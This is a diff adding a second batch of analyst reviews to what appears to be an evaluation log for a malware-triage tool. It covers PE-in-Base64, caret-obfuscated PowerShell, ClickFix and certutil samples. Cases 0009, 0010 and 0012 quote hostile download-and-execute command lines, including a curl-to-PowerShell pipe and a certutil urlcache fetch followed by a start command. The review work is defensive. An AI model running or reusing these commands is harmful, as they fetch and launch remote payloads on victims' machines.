@@ -265,3 +265,167 @@ proposal (ADR-0007 · Verdict-Evidence Gating) will be drafted.
 **No code changes made in this batch.** This is evidence-collection only, per the
 2026-02-28 operator directive.
 
+
+---
+
+## Historical case-mining batch 2 · 2026-02-28
+
+**Scope:** 5 more workspace_cases sampled for **sample-class diversity** (PE-embedded,
+cmd-caret-obfuscation, ClickFix-style, RTF-embedded, certutil-LOLBAS). Reviews use
+the same 9-category template. Numbering continues 0008–0012.
+
+---
+
+### Case 0008 — PE binary embedded in Base64 wrapper (`Do no download into your machine`)
+
+- Source: workspace_cases `78851a40…`
+- Sample class: **pe-executable-b64-wrapped**
+- Artifact: `TVqQAAMAAAAEAAAA//8AALg…` (Base64 → MZ/PE header)
+- Stored output: Malicious 70%; 4 indicators (`PE header validated, e_lfanew=0x108`); IOCs empty; MITRE `T1027`
+
+**Evidence tiers**
+- Observable: valid MZ signature, PE header offset 264, DOS stub "This program cannot be run in DOS mode"
+- Inference: PE-in-b64 is a payload-delivery pattern
+- Hypothesis (excluded): specific malware family
+
+| Category | Assessment | Reasoning |
+|---|---|---|
+| Evidence Sufficiency | Sufficient | Valid PE structure is unambiguous |
+| Decode Completeness | Pass | Base64 peeled cleanly |
+| IOC Completeness | **Partial** | PE binary has extractable imports / IATs / embedded strings — none surfaced |
+| MITRE Mapping | **Missing** | T1027 alone; T1105 (Ingress) and T1140 (Deobfuscate) also fit |
+| Verdict | Useful | 70% Malicious is defensible |
+| Explanation Quality | Clear | Reason cites PE-header offsets |
+| Evidence Traceability | Yes | — |
+| Analyst Notes | New pattern candidate **P-PE-INTROSPECTION** — decoder recognises PE structure but does not walk imports/strings for IOC extraction | — |
+| Action | **Monitor** | 1st observation |
+
+---
+
+### Case 0009 — cmd caret ^ obfuscation + PS EncodedCommand + BITS download (`Suitable`)
+
+- Source: workspace_cases `69bcf510…`
+- Sample class: **cmd-caret + ps-encoded + bits-transfer**
+- Artifact: `"C:\Windows\System32\cmd.exe" /c p^ow^ER^s^HE^LL -e WwBzAFkA…`
+- Stored output: Malicious 90%; 15 indicators; IOCs `urls=[http://georgeprapas.com/cem/VVZMYLHaSOcblqo.exe]`, `domains=[georgeprapas.com]`; MITRE `T1197, T1082, T1105, T1140, T1497.003, T1059.001`
+
+**Evidence tiers**
+- Observable: caret defeated → PS EncodedCommand decoded → explicit `Start-BitsTransfer` + URL + `.exe` drop + time-delay loop
+- Inference: staged downloader targeting Windows PE payload
+- Hypothesis (excluded): specific family
+
+| Category | Assessment | Reasoning |
+|---|---|---|
+| Evidence Sufficiency | Sufficient | — |
+| Decode Completeness | **Pass** | Caret + UTF-16 base64 both handled |
+| IOC Completeness | **Pass** | URL + domain extracted |
+| MITRE Mapping | **Appropriate** | T1197 BITS, T1105 Ingress, T1497.003 sandbox-evasion all justified |
+| Verdict | **Useful** | 90% appropriate |
+| Explanation Quality | Clear | — |
+| Evidence Traceability | Yes | — |
+| Analyst Notes | Reference-quality case: what "good" looks like. No gap. | — |
+| Action | **No Action** | — |
+
+---
+
+### Case 0010 — ClickFix-style curl-to-PowerShell chain (`ClickFix`)
+
+- Source: workspace_cases `50701f35…`
+- Sample class: **cmd-wildcard-lolbin + click-fix**
+- Artifact: `cmd /c start /min cmd /v:on /k echo off & for /f %k in ('where curl.exe') do %k https://tommy-aa.lol/f | powershell.exe cmd …`
+- Stored output: Malicious 95%; 15 indicators; IOCs `urls=[https://tommy-aa.lol/f]`, `domains=[chrome.nativemessaging.in, tommy-aa.lol]`; MITRE `T1059.003, T1218.010, T1583.001, T1027`
+
+**Evidence tiers**
+- Observable: cmd wildcards `where c*d.e?e`; caret `h^t^t^p^s^:^/^/`; curl → powershell pipe; `.lol` TLD
+- Inference: ClickFix (paste-and-execute) technique — canonical fake-CAPTCHA lure
+- Hypothesis (excluded): campaign attribution
+
+| Category | Assessment | Reasoning |
+|---|---|---|
+| Evidence Sufficiency | Sufficient | — |
+| Decode Completeness | Pass | Caret + wildcards resolved |
+| IOC Completeness | Pass | URL + domains extracted |
+| MITRE Mapping | **Missing** | Primary technique is **T1204.004** (User Execution: Malicious Copy and Paste) — not labelled |
+| Verdict | Useful | 95% justified |
+| Explanation Quality | Clear | — |
+| Evidence Traceability | Yes | — |
+| Analyst Notes | New pattern candidate **P-MITRE-CLICKFIX-COVERAGE** — ClickFix / paste-and-execute not surfaced as its own ATT&CK subtype | — |
+| Action | **Monitor** | 1st observation |
+
+---
+
+### Case 0011 — RTF-embedded content with placeholder-looking IOCs (`NEW_Alert`)
+
+- Source: workspace_cases `931851d1…`
+- Sample class: **rtf-document**
+- Artifact: `{\rtf1\ansi\ansicpg1252\cocoartf2870 \cocoatextscaling0 …`
+- Stored output: Malicious 95%; 11 indicators; IOCs `urls=[http://127.0.0.1:40492/mcp\\\\]`, `ips=[127.0.0.1, 1.0.0.721]`, `domains=[resolved.provider.name]`; MITRE `T1059.001, T1057, T1082`; LOLBAS `Change.exe, Query.exe`
+
+**Evidence tiers**
+- Observable: RTF passthrough; localhost URL `127.0.0.1:40492/mcp`; extracted IP `1.0.0.721` (octet 721 > 255 = **not a valid IP**); domain `resolved.provider.name` (reads as placeholder text)
+- Inference: MCP (Model Context Protocol) local callback — likely developer/AI-agent tooling, not C2
+- Hypothesis (excluded): whether the RTF is genuinely malicious or holds AI-tooling metadata
+
+| Category | Assessment | Reasoning |
+|---|---|---|
+| Evidence Sufficiency | **Partially Sufficient** | RTF context not fully inspectable from stored output |
+| Decode Completeness | Pass | RTF passthrough is correct |
+| IOC Completeness | **Partial (with false positives)** | `1.0.0.721` = invalid IP (octet >255); `resolved.provider.name` reads as placeholder |
+| MITRE Mapping | **Incorrect** (leaning) | `T1059.001 PowerShell hidden` on an RTF is unsupported; LOLBAS `Change.exe`/`Query.exe` may be false positives from RTF style tokens |
+| Verdict | **Too Strong** | 95% Malicious driven partly by localhost URL and placeholder-looking domain |
+| Explanation Quality | Partial | Reason cites `127.0.0.1:40492/mcp` — localhost is not C2 |
+| Evidence Traceability | Yes | Traceable — but traces back to over-extracted signals |
+| Analyst Notes | Two new pattern candidates: **P-IOC-VALIDATION** (regex accepts IP octets >255) and **P-VERDICT-LOCALHOST** (verdict weight not discounted for `127.0.0.1`/RFC1918) | — |
+| Action | **Monitor** | 1st observation of each |
+
+---
+
+### Case 0012 — Certutil LOLBAS urlcache download (`Real_Confirmed_Authorized Activity`)
+
+- Source: workspace_cases `51448969…`
+- Sample class: **certutil-lolbin-download**
+- Artifact: `certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw %TEMP%\BfBjkkJBdU.exe & start /B %TEMP%\BfBjkkJBdU.exe`
+- Stored output: Malicious 95%; 10 indicators; IOCs `urls=[…10.200.49.6:8080…]`, `ips=[10.200.49.6, 6.94.002.01]`; MITRE `T1105, T1059.003`; LOLBAS `certutil.exe`
+
+**Evidence tiers**
+- Observable: canonical `certutil -urlcache -f` LOLBIN pattern; URL points to RFC1918 `10.200.49.6:8080` internal IP; downloads to `%TEMP%\BfBjkkJBdU.exe` then executes with `start /B`; the extra extracted IP `6.94.002.01` has an octet with leading-zero + is unlikely to be a real IP present in this input
+- Inference: post-exploitation stager on internal network (10.200.x = corporate/lab RFC1918)
+- Hypothesis (excluded): whether "Authorized Activity" in the case name is genuine red-team consent
+
+| Category | Assessment | Reasoning |
+|---|---|---|
+| Evidence Sufficiency | Sufficient | — |
+| Decode Completeness | Pass | — |
+| IOC Completeness | **Partial** | `6.94.002.01` extraction is suspect (leading-zero octets); no discrimination between internal (RFC1918) and external IPs |
+| MITRE Mapping | Appropriate | T1105 + T1059.003 fit |
+| Verdict | Useful | 95% justified for certutil-urlcache |
+| Explanation Quality | Clear | — |
+| Evidence Traceability | Yes | — |
+| Analyst Notes | **2nd observation of P-IOC-VALIDATION** (invalid IP octets extracted) | — |
+| Action | **Monitor** | Pattern approaches threshold |
+
+---
+
+## Updated pattern register (after Batches 1–2 · Cases 0001, 0003–0012)
+
+| Pattern code                          | Description                                                              | Cases                    | Count | Status  |
+| ------------------------------------- | ------------------------------------------------------------------------ | ------------------------ | ----- | ------- |
+| **P-VERDICT-STRUCTURAL**              | Verdict driven by encoding structure when decoded content is benign      | 0005, 0006 (+ 0001 aside) | **2** | Monitor |
+| **P-DECODER-DEPTH**                   | Decoder terminates on intermediate obfuscation layer                     | 0004                     | 1     | Monitor |
+| **P-CHAIN-FAILURE-VERDICT-COLLAPSE**  | Mid-chain decoder failure → null verdict card despite raw-input signals  | 0007                     | 1     | Monitor |
+| **P-PE-INTROSPECTION**                | PE structure recognised but imports/strings not walked for IOC extraction | 0008                     | 1     | Monitor |
+| **P-MITRE-CLICKFIX-COVERAGE**         | ClickFix / paste-and-execute (T1204.004) not surfaced as its own ATT&CK  | 0010                     | 1     | Monitor |
+| **P-IOC-VALIDATION**                  | IP-extraction regex accepts invalid octets (>255, leading zeros); no validation gate | 0011, 0012 | **2** | Monitor |
+| **P-VERDICT-LOCALHOST**               | Verdict weight not discounted for `127.0.0.1` / RFC1918 URLs             | 0011                     | 1     | Monitor |
+
+**None yet at the ≥3-case ADR threshold.** Two patterns (P-VERDICT-STRUCTURAL,
+P-IOC-VALIDATION) are one independent observation away from triggering an ADR draft.
+
+**Deliberate self-check:** Case 0002 (live Meterpreter) remains pending. If it
+independently exhibits either P-VERDICT-STRUCTURAL or P-IOC-VALIDATION, the
+threshold is crossed. If not, neither pattern is elevated on the strength of
+similar-looking artifacts.
+
+No code changes. No ADRs drafted. 10 cases banked toward the 20-case operational
+milestone.
+
